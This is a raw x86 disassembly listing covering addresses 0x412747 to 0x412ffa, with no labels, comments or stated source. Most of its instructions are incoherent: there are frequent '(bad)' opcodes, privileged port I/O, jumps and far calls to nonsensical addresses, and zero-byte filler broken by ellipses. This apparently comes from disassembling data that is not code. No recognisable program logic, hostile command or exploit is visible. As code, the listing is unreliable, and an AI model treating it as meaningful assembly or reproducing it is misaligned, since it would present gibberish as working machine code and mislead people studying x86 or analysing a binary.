  412747:	je     0x4126ed
  412749:	jb     0x4126f0
  41274b:	pop    es
  41274c:	in     al,0x94
  41274e:	xor    al,0xdf
  412750:	repnz mov eax,ds:0xa197af16
  412756:	xchg   esp,eax
  412757:	or     esi,esp
  412759:	jo     0x412728
  41275b:	cmp    dl,bl
  41275d:	mov    eax,ds:0x27d23774
  412762:	imul   DWORD PTR [ebx]
  412764:	ins    BYTE PTR es:[edi],dx
  412765:	jp     0x412765
  412767:	cmp    dl,al
  412769:	daa    
  41276a:	jecxz  0x412797
  41276c:	xchg   ecx,eax
  41276d:	imul   ebp,esi,0x38
  412770:	sti    
  412771:	xchg   ebx,eax
  412772:	fild   WORD PTR [ebx]
  412774:	mov    ebx,cs
  412776:	mov    eax,ds:0xf
	...
  41278b:	add    BYTE PTR [edi+eax*2-0x26f1d896],cl
  412792:	(bad)  
  412793:	sar    BYTE PTR [ecx],1
  412795:	inc    ebp
  412796:	sbb    bl,BYTE PTR [ebp+0x4a]
  412799:	inc    esi
  41279a:	dec    ebp
  41279b:	ret    
  41279c:	adc    DWORD PTR [eax],0x2d
  41279f:	cmp    bl,cl
  4127a1:	dec    ecx
  4127a2:	scas   al,BYTE PTR es:[edi]
  4127a3:	scas   al,BYTE PTR es:[edi]
  4127a4:	and    DWORD PTR [ecx-0x588bf7e4],0xffffffca
  4127ab:	cmp    BYTE PTR [edx-0x73],ah
  4127ae:	lahf   
  4127af:	scas   eax,DWORD PTR es:[edi]
  4127b0:	jne    0x4127f6
  4127b2:	pop    ss
  4127b3:	add    al,0x8c
  4127b5:	mov    cl,0x35
  4127b7:	cmp    al,al
  4127b9:	mov    al,ds:0x2742d10f
  4127be:	out    0x2b,eax
  4127c0:	mov    edx,0x86386ea1
  4127c5:	mov    esp,0xa1737857
  4127ca:	pop    esi
  4127cb:	aaa    
  4127cc:	pop    esi
  4127cd:	aam    0x98
  4127cf:	cmp    BYTE PTR [edx],bl
  4127d1:	mov    eax,ds:0x5be1354e
  4127d6:	out    dx,al
  4127d7:	scas   al,BYTE PTR es:[edi]
  4127d8:	iret   
  4127d9:	loopne 0x4127e3
  4127db:	int3   
  4127dc:	xor    al,0x54
  4127de:	or     BYTE PTR [edx+edi*1-0x63],bl
  4127e2:	pop    eax
  4127e3:	mov    esi,0x1e1828b4
  4127e8:	cmp    cl,BYTE PTR [ebp-0x5e0fa220]
  4127ee:	cmc    
  4127ef:	loop   0x4127f1
	...
  412801:	add    BYTE PTR [eax],al
  412803:	add    BYTE PTR [edi+0x25],cl
  412806:	cmp    BYTE PTR [ecx-0x6e0fa7fa],bl
  41280c:	nop
  41280d:	xchg   esp,eax
  41280e:	in     eax,0x37
  412810:	test   BYTE PTR [eax],ch
  412812:	add    BYTE PTR [ecx],al
  412814:	mov    bh,0x77
  412816:	cmc    
  412817:	out    0xc3,al
  412819:	mov    eax,ds:0x477f17b
  41281e:	sub    al,0xd6
  412820:	pop    ebx
  412821:	mov    ds:0x2863cd7b,al
  412826:	lock (bad) 
  412828:	fstp   QWORD PTR [eax-0x6092e920]
  41282e:	cmc    
  41282f:	shl    DWORD PTR [edi],0x78
  412832:	cmc    
  412833:	scas   al,BYTE PTR es:[edi]
  412834:	bswap  ebx
  412836:	pop    es
  412837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412838:	jg     0x41281a
  41283a:	scas   eax,DWORD PTR es:[edi]
  41283b:	sahf   
  41283c:	mov    ds:0xea9bf59e,eax
  412841:	addr16 or eax,0xbbdef214
  412847:	push   ss
  412848:	dec    ecx
  412849:	mov    al,ds:0x4f842484
  41284e:	pop    ebp
  41284f:	jbe    0x41284e
  412851:	(bad)  
  412852:	cmc    
  412853:	hlt    
  412854:	xchg   ebx,eax
  412855:	lods   al,BYTE PTR ds:[esi]
  412856:	push   ebx
  412857:	adc    bh,BYTE PTR [ebx-0x62]
  41285a:	add    DWORD PTR [ecx],ebp
  41285c:	fdivr  QWORD PTR ds:0x12586258
  412862:	je     0x4128b1
  412864:	xchg   ecx,eax
  412865:	es inc esp
	...
  41287b:	add    BYTE PTR [ebp-0x108af75a],ah
  412881:	loope  0x412879
  412883:	dec    ebp
  412884:	mov    ecx,0xba0008f0
  412889:	div    BYTE PTR es:[ebp-0x57]
  41288d:	into   
  41288e:	pop    esi
  41288f:	inc    DWORD PTR [eax]
  412891:	mov    eax,fs
  412893:	(bad)  
  412894:	jnp    0x4128fd
  412896:	test   BYTE PTR [ebx],0x9d
  412899:	imul   esp,DWORD PTR [eax+eax*4],0xffffffcb
  41289d:	xchg   ebp,eax
  41289e:	jnp    0x4128c8
  4128a0:	repz inc sp
  4128a3:	cld    
  4128a4:	sete   BYTE PTR [ebx+0x5bc3a945]
  4128ab:	call   0x37f0d4
  4128b0:	sahf   
  4128b1:	push   ebx
  4128b2:	jns    0x4128c8
  4128b4:	dec    ebp
  4128b5:	xchg   edx,eax
  4128b6:	or     bh,ch
  4128b8:	or     esp,DWORD PTR [edi+0x7c]
  4128bb:	cld    
  4128bc:	jae    0x41288d
  4128be:	div    BYTE PTR [ebp+0x7d]
  4128c1:	imul   ebp,DWORD PTR [esi+0x2663afe],0xffffffd8
  4128c8:	dec    ebp
  4128c9:	jle    0x4128f9
  4128cb:	jmp    FWORD PTR [edx]
  4128cd:	addr16 cmp al,al
  4128d0:	in     al,dx
  4128d1:	data16 idiv bh
  4128d4:	cli    
  4128d5:	mov    fs:0x89e47238,eax
  4128db:	mov    edi,0x48f7a3
	...
  4128f4:	mov    eax,0xa250f1d4
  4128f9:	addr16 jl 0x41290c
  4128fc:	stos   BYTE PTR es:[edi],al
  4128fd:	in     al,0x1
  4128ff:	call   0x37d6cd
  412904:	push   ds
  412905:	push   ebx
  412906:	jns    0x412938
  412908:	mov    ebp,ds
  41290a:	test   BYTE PTR [esp+edx*1-0x2b],al
  41290e:	cmc    
  41290f:	jmp    DWORD PTR [edx]
  412911:	pop    ss
  412912:	aas    
  412913:	je     0x4128a9
  412915:	inc    ebp
  412916:	test   eax,0xc6660323
  41291b:	inc    BYTE PTR [ecx-0x5747de4b]
  412921:	jbe    0x412961
  412923:	(bad)  
  412924:	popa   
  412925:	cmp    DWORD PTR [esi],0xb885e474
  41292b:	pop    es
  41292c:	in     al,0xd
  41292e:	(bad)  
  41292f:	(bad)  
  412930:	rol    DWORD PTR [edx+ebx*4-0x786234da],cl
  412937:	retf   0xa98d
  41293a:	idiv   DWORD PTR [edi-0x1c4520b]
  412940:	mov    bl,0xba
  412942:	outs   dx,BYTE PTR ds:[esi]
  412943:	aaa    
  412944:	xchg   ebx,eax
  412945:	dec    eax
  412946:	outs   dx,BYTE PTR ds:[esi]
  412947:	or     al,bh
  412949:	inc    eax
  41294a:	or     eax,0x2cad7c68
  41294f:	mov    ebp,0xe8045f93
  412954:	scas   al,BYTE PTR es:[edi]
  412955:	xchg   edi,eax
  412956:	cmp    edi,esi
	...
  41296c:	pop    ss
  41296d:	jmp    0x41293e
  41296f:	pop    ebp
  412970:	fcomi  st,st(4)
  412972:	dec    edx
  412973:	jl     0xe2ca8d9
  412979:	clc    
  41297a:	cmp    al,0xf6
  41297c:	arpl   WORD PTR [edi],ax
  41297e:	mov    es,WORD PTR [eax+ebx*2+0x5c]
  412982:	cmp    esi,DWORD PTR [esp+edi*2+0x16]
  412986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412987:	or     esi,DWORD PTR [edx+ebp*1]
  41298a:	pop    ss
  41298b:	add    BYTE PTR [edx+esi*4-0x9448bb7],cl
  412992:	mov    ch,0xf7
  412994:	mov    WORD PTR [edi+ebx*8-0x532a73fd],ss
  41299b:	das    
  41299c:	and    dl,BYTE PTR [esi-0x6b59fc21]
  4129a2:	leave  
  4129a3:	add    esp,DWORD PTR [esi+0x1903d994]
  4129a9:	pop    eax
  4129aa:	cmp    edx,esp
  4129ac:	adc    BYTE PTR [eax],bl
  4129ae:	xor    al,0x2d
  4129b0:	cli    
  4129b1:	popf   
  4129b2:	(bad)  
  4129b3:	xor    al,0x78
  4129b5:	pushf  
  4129b6:	cs scas eax,DWORD PTR es:[edi]
  4129b8:	out    0xac,eax
  4129ba:	(bad)  
  4129bb:	adc    BYTE PTR [esp+edx*4-0x6da0bc16],cl
  4129c2:	or     bh,BYTE PTR [edi-0x3d481295]
  4129c8:	retf   
  4129c9:	sahf   
  4129ca:	jl     0x4129df
  4129cc:	mov    ah,0xf0
  4129ce:	leave  
  4129cf:	xor    al,0x0
	...
  4129e1:	add    BYTE PTR [eax],al
  4129e3:	add    BYTE PTR [edx+0x8871009],bh
  4129e9:	test   eax,0x44aa34d6
  4129ee:	xor    DWORD PTR [esp+ebx*4],ebp
  4129f1:	push   0xffffffde
  4129f3:	xor    al,0x4
  4129f5:	sbb    al,dl
  4129f7:	sub    al,0x92
  4129f9:	popf   
  4129fa:	pop    ecx
  4129fb:	add    al,0x8b
  4129fd:	out    0xaf,eax
  4129ff:	sub    al,0x82
  412a01:	popf   
  412a02:	mov    esi,0x3c9d87ae
  412a07:	or     al,0x64
  412a09:	lods   al,BYTE PTR ds:[esi]
  412a0a:	lods   al,BYTE PTR ds:[esi]
  412a0b:	xor    al,0x6a
  412a0d:	popf   
  412a0e:	pop    esp
  412a0f:	xor    ebx,DWORD PTR [edx-0x63]
  412a12:	sahf   
  412a13:	sub    esi,DWORD PTR ds:0x52348676
  412a19:	push   edi
  412a1a:	xchg   DWORD PTR [eax],ebp
  412a1c:	sbb    ebx,DWORD PTR [ebp-0x64d4c804]
  412a22:	or     bl,bl
  412a24:	(bad)  
  412a25:	xchg   esp,eax
  412a26:	mov    edi,0x5b948bab
  412a2b:	jb     0x412aa0
  412a2d:	adc    al,0xcd
  412a2f:	pop    ecx
  412a30:	jo     0x4129d0
  412a32:	cmc    
  412a33:	ficomp DWORD PTR fs:[eax-0x731db1a8]
  412a3a:	cmc    
  412a3b:	mov    esp,0xdbe9ac93
  412a40:	(bad)  
  412a41:	xchg   esp,eax
  412a42:	add    DWORD PTR [ecx],ebp
  412a44:	nop
  412a45:	pop    ss
  412a46:	(bad)
	...
  412a5a:	add    BYTE PTR [eax],al
  412a5c:	(bad)  
  412a5d:	xchg   esp,eax
  412a5e:	int    0xac
  412a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a61:	popf   
  412a62:	cmc    
  412a63:	jmp    0x1d8cfff7
  412a68:	mov    al,ds:0x25e90896
  412a6d:	popf   
  412a6e:	pop    edi
  412a6f:	jmp    0xe9a0c769
  412a74:	or     bl,BYTE PTR [eax-0x4]
  412a77:	cdq    
  412a78:	adc    bl,BYTE PTR [eax]
  412a7a:	std    
  412a7b:	idiv   BYTE PTR [edi-0x62]
  412a7e:	pop    eax
  412a7f:	out    0xe5,al
  412a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a82:	cmc    
  412a83:	push   esp
  412a84:	pop    esp
  412a85:	mov    ch,0xbb
  412a87:	sti    
  412a88:	(bad)  
  412a89:	xchg   esp,eax
  412a8a:	add    DWORD PTR [ecx+0x35e192d4],ebp
  412a90:	sub    bl,ch
  412a92:	inc    eax
  412a93:	sub    BYTE PTR [eax-0x68268465],cl
  412a99:	mov    WORD PTR [edx],fs
  412a9b:	scas   al,BYTE PTR es:[edi]
  412a9c:	mov    edi,0x1574d90e
  412aa1:	test   al,0xfd
  412aa3:	sahf   
  412aa4:	lahf   
  412aa5:	dec    ebx
  412aa6:	pop    edx
  412aa7:	or     DWORD PTR [esi+0x6e],0x209f8ef5
  412aae:	sbb    al,0x0
  412ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ab1:	js     0x412aff
  412ab3:	sub    al,dl
  412ab5:	add    BYTE PTR [di+0x5fb5],0xf6
  412abb:	jmp    DWORD PTR [edx+0xf7e51d]
	...
  412ad1:	add    BYTE PTR [eax],al
  412ad3:	add    BYTE PTR [edx+0x3175f667],dh
  412ad9:	addr16 jl 0x412ae4
  412adc:	int    0x43
  412ade:	repz inc edx
  412ae1:	addr16 mov esp,0xf667caf0
  412ae7:	call   0x37d8f1
  412aec:	ret    0xfdcd
  412aef:	jmp    0x412b5d
  412af1:	addr16 jl 0x412af0
  412af4:	jge    0x412acd
  412af6:	pop    ss
  412af7:	add    ch,dh
  412af9:	pop    eax
  412afa:	(bad)  
  412afb:	adc    ch,ah
  412afd:	mov    esp,0x4c66ec82
  412b02:	cdq    
  412b03:	push   edi
  412b04:	xchg   edx,eax
  412b05:	fld    QWORD PTR [ecx]
  412b07:	call   0x37c920
  412b0c:	scas   al,BYTE PTR es:[edi]
  412b0d:	push   edi
  412b0e:	jl     0x412b15
  412b10:	add    bl,BYTE PTR [ecx-0x39]
  412b13:	sbb    al,0xb5
  412b15:	sbb    BYTE PTR [esp+edx*4+0x1e],cl
  412b19:	in     al,0x11
  412b1b:	psubq  mm1,mm6
  412b1e:	push   es
  412b1f:	push   eax
  412b20:	mov    dl,0x1d
  412b22:	dec    esi
  412b23:	push   cs
  412b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b25:	xchg   edi,eax
  412b26:	mov    esi,0x6c77047
  412b2b:	mov    dh,0xaa
  412b2d:	xchg   esp,eax
  412b2e:	pop    eax
  412b2f:	psubq  mm1,mm6
  412b32:	add    dl,BYTE PTR [eax+0x62]
  412b35:	sbb    eax,0xa4e
	...
  412b4a:	add    BYTE PTR [eax],al
  412b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b4d:	xchg   edi,eax
  412b4e:	mov    esi,0xd9b48c47
  412b53:	push   cs
  412b54:	sbb    dh,BYTE PTR [edx-0xc]
  412b57:	dec    edi
  412b58:	fwait
  412b59:	pop    edx
  412b5a:	ret    0xdc05
  412b5d:	stos   BYTE PTR es:[edi],al
  412b5e:	jb     0x412ba6
  412b60:	nop
  412b61:	jge    0x412b9c
  412b63:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  412b65:	push   ss
  412b66:	mov    ebp,0xc0208c40
  412b6b:	fwait
  412b6c:	mov    esp,0x8c104445
  412b71:	lods   eax,DWORD PTR ds:[esi]
  412b72:	mov    es,ebx
  412b74:	pop    eax
  412b75:	cs mov eax,0xb4d98c1f
  412b7b:	(bad)  
  412b7c:	jns    0x412b3f
  412b7e:	cmp    dh,BYTE PTR [esp+ebx*4+0x55]
  412b82:	or     BYTE PTR [esi],dh
  412b84:	repz imul esi,esi,0x750760bf
  412b8b:	inc    esp
  412b8c:	add    al,0x7a
  412b8e:	mov    al,0x7
  412b90:	fcomi  st,st(7)
  412b92:	add    eax,ebp
  412b94:	inc    esi
  412b95:	iret   
  412b96:	cmp    bh,dh
  412b98:	retf   
  412b99:	pop    ss
  412b9a:	popf   
  412b9b:	(bad)  
  412b9c:	cmp    DWORD PTR [ebp-0x5d915fef],esi
  412ba2:	aaa    
  412ba3:	mov    WORD PTR [ecx+0x49],cs
  412ba6:	fsin   
  412ba8:	and    DWORD PTR [ebp-0x45916bec],edx
  412bae:	aaa    
  412baf:	inc    BYTE PTR [eax]
	...
  412bc1:	add    BYTE PTR [eax],al
  412bc3:	add    BYTE PTR [ecx],ah
  412bc5:	and    eax,0xd5747437
  412bca:	jbe    0x412bed
  412bcc:	mov    edx,ebx
  412bce:	aaa    
  412bcf:	je     0x412bf5
  412bd1:	les    esp,FWORD PTR [edi+0x13e37b24]
  412bd7:	das    
  412bd8:	jae    0x412c3b
  412bda:	hlt    
  412bdb:	(bad)  
  412bdc:	loope  0x412b72
  412bde:	pop    es
  412bdf:	sbb    al,0x7e
  412be1:	jbe    0x412b79
  412be3:	xor    DWORD PTR [edx+0x20],ebx
  412be6:	jae    0x412c19
  412be8:	fdivr  DWORD PTR [edi+eax*4-0x62]
  412bec:	ins    DWORD PTR es:[edi],dx
  412bed:	cdq    
  412bee:	mov    ?,WORD PTR [edi-0x38]
  412bf1:	clc    
  412bf2:	rdtsc  
  412bf4:	sar    BYTE PTR [edi+eax*4-0x2e],0x6d
  412bf9:	cdq    
  412bfa:	xor    WORD PTR [eax-0x6c489180],sp
  412c01:	cdq    
  412c02:	fmul   QWORD PTR [ebx]
  412c04:	and    al,0x71
  412c06:	add    DWORD PTR [ecx],esi
  412c08:	adc    bl,BYTE PTR [edx+0x5ff397dc]
  412c0e:	add    al,0x31
  412c10:	add    bh,BYTE PTR [edx]
  412c12:	cmp    BYTE PTR [esi-0x69],al
  412c15:	xchg   esp,eax
  412c16:	xchg   esp,eax
  412c17:	jl     0x412c00
  412c19:	adc    ebp,DWORD PTR [eax+ebp*1]
  412c1c:	ficomp WORD PTR [ecx+0x7c58312e]
  412c22:	fs xchg ebx,ebx
  412c25:	popf   
  412c26:	push   ds
  412c27:	xor    DWORD PTR [eax],eax
	...
  412c39:	add    BYTE PTR [eax],al
  412c3b:	add    BYTE PTR [ebx-0x67],al
  412c3e:	pushf  
  412c3f:	sti    
  412c40:	mov    bl,0x3c
  412c42:	pop    esp
  412c43:	xor    edx,eax
  412c45:	cdq    
  412c46:	jl     0x412c53
  412c48:	or     DWORD PTR [eax],edx
  412c4a:	loopne 0x412c77
  412c4c:	mov    dl,0x99
  412c4e:	(bad)  
  412c4f:	xor    BYTE PTR [eax],ah
  412c51:	mov    dh,ch
  412c53:	mov    dh,0x8b
  412c55:	lods   al,BYTE PTR ds:[esi]
  412c56:	gs pop esi
  412c58:	call   0x4794:0x26044999
  412c5f:	xor    DWORD PTR [esi+0x87edf94],ecx
  412c65:	xchg   esp,eax
  412c66:	mov    ebx,0x8447a30
  412c6b:	inc    ebx
  412c6c:	mov    ebp,0x9d97b9a
  412c71:	cdq    
  412c72:	pop    edi
  412c73:	jmp    0xe95997ff
  412c78:	(bad)  
  412c79:	ror    DWORD PTR [ebx-0xa656767],1
  412c7f:	stc    
  412c80:	(bad)  
  412c81:	xchg   esp,eax
  412c82:	or     BYTE PTR [esi+0x7ef9a50a],ch
  412c88:	jl     0x412c1d
  412c8a:	or     cl,ch
  412c8c:	(bad)  
  412c8d:	ror    DWORD PTR [ebx-0xa659f8f],1
  412c93:	jmp    0x2649c127
  412c98:	adc    bl,BYTE PTR [ebp-0x66a3a907]
  412c9e:	cmc    
  412c9f:	jmp    0x412ca4
	...
  412cb4:	(bad)  
  412cb5:	or     eax,0x8380e15c
  412cba:	(bad)  
  412cbb:	jmp    0x3b3a3d3a
  412cc0:	mov    esp,0x125c589a
  412cc5:	lods   eax,DWORD PTR ds:[esi]
  412cc6:	stc    
  412cc7:	es pushf 
  412cc9:	dec    ecx
  412cca:	and    DWORD PTR [edi+esi*2-0x5a],0xfffffff5
  412ccf:	push   ss
  412cd0:	mov    edi,0x7cf97b99
  412cd5:	and    BYTE PTR [esi+eax*1],al
  412cd8:	cli    
  412cd9:	nop
  412cda:	(bad)  
  412cdb:	jmp    0xf6514d5c
  412ce0:	fcom   DWORD PTR [ecx+ecx*4+0x2c]
  412ce4:	xchg   DWORD PTR [esi-0x7677190b],esp
  412cea:	mov    esp,ss
  412cec:	nop
  412ced:	xchg   esp,eax
  412cee:	or     BYTE PTR [edx+0x1d],ch
  412cf1:	lods   eax,DWORD PTR ds:[esi]
  412cf2:	stc    
  412cf3:	into   
  412cf4:	mov    ebx,0xf1000697
  412cf9:	js     0x412cf0
  412cfb:	jmp    DWORD PTR [ebp-0x4]
  412cfe:	xor    BYTE PTR [ecx-0x5c],0x90
  412d02:	add    DWORD PTR [ebp-0x9978b],0xffffffa5
  412d09:	js     0x412cda
  412d0b:	pcmpgtw mm2,QWORD PTR [ebx+ecx*4+0x608971c0]
  412d13:	cwde   
  412d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d15:	shl    ebp,1
  412d17:	mov    WORD PTR [eax],es
	...
  412d29:	add    BYTE PTR [eax],al
  412d2b:	add    BYTE PTR [eax-0x45000b70],dh
  412d31:	shr    ch,0xc5
  412d34:	sub    dl,BYTE PTR [eax+ecx*1-0x73680a7b]
  412d3b:	scas   eax,DWORD PTR es:[edi]
  412d3c:	xor    eax,0xb0c70894
  412d41:	ins    BYTE PTR es:[edi],dx
  412d42:	cli    
  412d43:	(bad)  
  412d44:	mov    edx,0x1bef088d
  412d49:	stc    
  412d4a:	test   eax,0x83943471
  412d4f:	test   ebp,esp
  412d51:	imul   esi,esi,0xffffffff
  412d54:	adc    eax,0xf50fa77c
  412d59:	xchg   ebx,eax
  412d5a:	mov    eax,eax
  412d5c:	add    DWORD PTR [edx+0x639185ce],ebp
  412d62:	idiv   bh
  412d64:	jecxz  0x412cf9
  412d66:	in     eax,0xbe
  412d68:	or     eax,0xb541782a
  412d6d:	adc    al,0x8d
  412d6f:	add    BYTE PTR [ebp-0x72af0999],cl
  412d75:	adc    eax,DWORD PTR [edi]
  412d77:	add    BYTE PTR [ebp-0x758b49f4],dh
  412d7d:	dec    edi
  412d7e:	mov    esp,fs
  412d80:	mov    dh,0x66
  412d82:	test   BYTE PTR [edi],0x8c
  412d85:	lods   eax,DWORD PTR ds:[esi]
  412d86:	push   ss
  412d87:	mov    ebp,0x40bccdf4
  412d8c:	mov    WORD PTR [eax],fs
  412d8e:	cmp    bh,0x0
	...
  412da1:	add    BYTE PTR [eax],al
  412da3:	add    BYTE PTR [ebx+0x644f26d6],al
  412da9:	dec    ecx
  412daa:	cmc    
  412dab:	jmp    FWORD PTR [ebx+0x30]
  412dae:	dec    ecx
  412daf:	je     0x412d6f
  412db1:	sub    al,0x78
  412db3:	jecxz  0x412e14
  412db5:	mul    BYTE PTR [esi]
  412db7:	push   es
  412db8:	mov    WORD PTR [esi],cs
  412dba:	fs je  0x412e2d
  412dbd:	xchg   ebx,eax
  412dbe:	or     al,0xff
  412dc0:	mov    ecx,0xa07426a1
  412dc5:	push   ss
  412dc6:	jo     0x412daf
  412dc8:	aas    
  412dc9:	push   ds
  412dca:	es (bad) 
  412dcc:	loope  0x412de6
  412dce:	cmp    bh,dh
  412dd0:	and    ebp,DWORD PTR [esi]
  412dd2:	mov    al,0xf
  412dd4:	sbb    eax,DWORD PTR [eax]
  412dd6:	repnz adc edi,DWORD PTR cs:[esi]
  412dda:	adc    DWORD PTR [edx-0x15d9b9f7],ebx
  412de0:	scas   al,BYTE PTR es:[edi]
  412de1:	ret    
  412de2:	or     al,0xff
  412de4:	sub    DWORD PTR [ecx+0x5e987426],0x65dfe770
  412dee:	es (bad) 
  412df0:	sbb    DWORD PTR [ecx+0x75dbfe3a],eax
  412df6:	mov    al,0xf
  412df8:	shl    DWORD PTR [edi],cl
  412dfa:	sub    eax,0x1185cbf2
  412dff:	jbe    0x412dc2
  412e01:	lea    esp,[esi]
  412e03:	inc    BYTE PTR [ecx]
  412e05:	mov    DWORD PTR [edx],edi
  412e07:	inc    BYTE PTR [eax]
	...
  412e19:	add    BYTE PTR [eax],al
  412e1b:	add    BYTE PTR [ebx-0x73f1656c],dh
  412e21:	lods   eax,DWORD PTR ds:[esi]
  412e22:	xor    al,0xc1
  412e24:	js     0x412dba
  412e26:	(bad)  
  412e28:	push   es
  412e29:	test   al,0x62
  412e2b:	dec    eax
  412e2c:	xchg   edi,eax
  412e2d:	adc    bl,BYTE PTR ds:0xdf53d647
  412e33:	add    edi,eax
  412e35:	push   ebp
  412e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e37:	(bad)  
  412e38:	ja     0x412dcf
  412e3a:	fild   WORD PTR [ebx]
  412e3c:	mov    WORD PTR [ecx-0x61],gs
  412e3f:	aam    0xdb
  412e41:	inc    esp
  412e42:	push   esp
  412e43:	xlat   BYTE PTR ds:[ebx]
  412e44:	addr16 inc ebx
  412e46:	scas   al,BYTE PTR es:[edi]
  412e47:	pop    ss
  412e48:	push   ecx
  412e49:	dec    edx
  412e4a:	and    BYTE PTR [ecx+ecx*1],al
  412e4d:	aad    0x18
  412e4f:	add    dh,BYTE PTR [edi]
  412e51:	jb     0x412eb5
  412e53:	scas   eax,DWORD PTR es:[edi]
  412e54:	inc    edi
  412e55:	xchg   ebp,eax
  412e56:	hlt    
  412e57:	add    DWORD PTR [edi],esp
  412e59:	jp     0x412e72
  412e5b:	mov    ah,0x3e
  412e5d:	push   ebp
  412e5e:	fild   QWORD PTR [eax+eiz*4]
  412e61:	cwde   
  412e62:	data16 mov bh,0x8b
  412e65:	lods   al,BYTE PTR ds:[esi]
  412e66:	sub    ebx,DWORD PTR [edi+0x1a]
  412e69:	xchg   esi,eax
  412e6a:	jp     0x412e43
  412e6c:	pop    ss
  412e6d:	or     dh,dl
  412e6f:	sub    al,0x80
  412e71:	cwde   
  412e72:	inc    esi
  412e73:	ror    BYTE PTR [ebx-0x73f7de35],cl
  412e79:	aas    
  412e7a:	jp     0x412e9c
  412e7c:	push   cs
  412e7d:	sar    DWORD PTR [ebx],1
  412e7f:	call   0x0:0x0
	...
  412e92:	add    BYTE PTR [eax],al
  412e94:	jmp    0x412ec1
  412e96:	test   DWORD PTR [eax+ebx*2],ebp
  412e99:	mov    WORD PTR [edi],ss
  412e9b:	leave  
  412e9c:	jnp    0x412e33
  412e9e:	push   ss
  412e9f:	jnp    0x412ee9
  412ea1:	cwde   
  412ea2:	push   ds
  412ea3:	mov    bh,0x93
  412ea5:	lods   al,BYTE PTR ds:[esi]
  412ea6:	jo     0x412ed5
  412ea8:	ret    0x9795
  412eab:	das    
  412eac:	sub    dl,BYTE PTR [ebx-0x21]
  412eaf:	sub    al,0x78
  412eb1:	ror    DWORD PTR [eax],0xa1
  412eb4:	into   
  412eb5:	xchg   ebp,eax
  412eb6:	div    BYTE PTR [edi+eiz*4-0x53]
  412eba:	xchg   ebx,eax
  412ebb:	loop   0x412f25
  412ebd:	xchg   esi,eax
  412ebe:	pusha  
  412ebf:	(bad)  
  412ec1:	push   esp
  412ec2:	or     BYTE PTR [ecx-0x17],al
  412ec5:	dec    ebp
  412ec6:	inc    edi
  412ec7:	jmp    0xc6702f73
  412ecc:	test   al,0x45
  412ece:	pop    eax
  412ecf:	push   ecx
  412ed0:	jg     0x412ef7
  412ed2:	inc    edi
  412ed3:	jmp    0x221a8f90
  412ed8:	dec    edi
  412ed9:	xchg   ebp,eax
  412eda:	neg    BYTE PTR [eax+ebx*2]
  412edd:	lods   eax,DWORD PTR ds:[esi]
  412ede:	adc    BYTE PTR [ebp-0x4a1f6960],bl
  412ee4:	sub    eax,0x8803f596
  412ee9:	sub    al,0x7d
  412eeb:	clc    
  412eec:	dec    esi
  412eed:	xchg   ebp,eax
  412eee:	ins    DWORD PTR es:[edi],dx
  412eef:	xor    bh,bh
  412ef1:	push   ebx
  412ef2:	or     BYTE PTR [ecx],al
  412ef4:	mov    ss,WORD PTR [eax+ecx*1+0x69]
	...
  412f0b:	add    BYTE PTR [edi+0x68662bb7],al
  412f11:	mov    cl,al
  412f13:	aad    0x2f
  412f15:	sub    eax,0x94ced875
  412f1a:	inc    ebp
  412f1b:	inc    ecx
  412f1c:	outs   dx,DWORD PTR gs:[esi]
  412f1e:	cmc    
  412f1f:	inc    esi
  412f20:	fild   WORD PTR [ebp+esi*8-0xc]
  412f24:	pop    esp
  412f25:	dec    ebp
  412f26:	inc    edi
  412f27:	jmp    0x41414fe4
  412f2c:	lock cdq 
  412f2e:	cmc    
  412f2f:	es ja  0x412f25
  412f32:	sub    bl,BYTE PTR [esi]
  412f34:	mov    al,ds:0xce99342d
  412f39:	xchg   esp,eax
  412f3a:	not    ah
  412f3c:	pop    esp
  412f3d:	dec    ebp
  412f3e:	inc    edi
  412f3f:	add    BYTE PTR [ebp-0x62f78399],ah
  412f45:	mov    al,0xf2
  412f47:	jmp    DWORD PTR [edx+0x1e67f5fb]
  412f4d:	loope  0x412f97
  412f4f:	add    BYTE PTR [edx+0x6448daa2],dh
  412f55:	nop
  412f56:	cmc    
  412f57:	jne    0x412fc6
  412f59:	mov    al,0xb8
  412f5b:	sti    
  412f5c:	push   edx
  412f5d:	rcr    BYTE PTR [edi+0x0],0xdd
  412f61:	leave  
  412f62:	gs inc ecx
  412f64:	gs mov edi,0x59add33c
  412f6a:	cmc    
  412f6b:	(bad)  
  412f6c:	cwde   
  412f6d:	nop
  412f6e:	in     eax,dx
  412f6f:	pushf  
	...
  412f84:	cs shl dh,0xff
  412f88:	js     0x412f46
  412f8a:	div    BYTE PTR [ebp+0x2d]
  412f8d:	mov    al,0xdd
  412f8f:	pop    ds
  412f90:	adc    al,al
  412f92:	rol    dl,0x29
  412f95:	cwde   
  412f96:	pop    ebx
  412f97:	mov    eax,DWORD PTR [ecx]
  412f99:	sbb    cl,cl
  412f9b:	hlt    
  412f9c:	mov    ds:0x356af6bf,eax
  412fa1:	xor    dl,BYTE PTR [esi-0x1]
  412fa4:	cmp    BYTE PTR [eax-0x40ed8613],dl
  412faa:	test   BYTE PTR [ecx+0x5cebc38],0x7f
  412fb1:	cmp    BYTE PTR [eax+0x0],cl
  412fb4:	out    0x97,eax
  412fb6:	or     BYTE PTR [eax],al
  412fb8:	pusha  
  412fb9:	adc    eax,0xbfa2fefe
  412fbe:	inc    ebp
  412fbf:	push   0x898e9
  412fc4:	jge    0x412f81
  412fc6:	add    al,0x0
  412fc8:	in     eax,0x2f
  412fca:	pop    ds
  412fcb:	jb     0x412f59
  412fcd:	cmp    al,0x9
  412fcf:	push   0xffcc2fa2
  412fd4:	xor    edx,DWORD PTR [esi]
  412fd6:	lods   al,BYTE PTR ds:[esi]
  412fd7:	inc    eax
  412fd8:	mov    WORD PTR [edx+0x3c54d2f8],ss
  412fde:	or     edi,edi
  412fe0:	sbb    DWORD PTR [ebp+0x11],esi
  412fe3:	fucomi st,st(7)
  412fe5:	jp     0x413009
  412fe7:	add    BYTE PTR [bx+si],al
	...
  412ffa:	add    BYTE PTR [eax],al
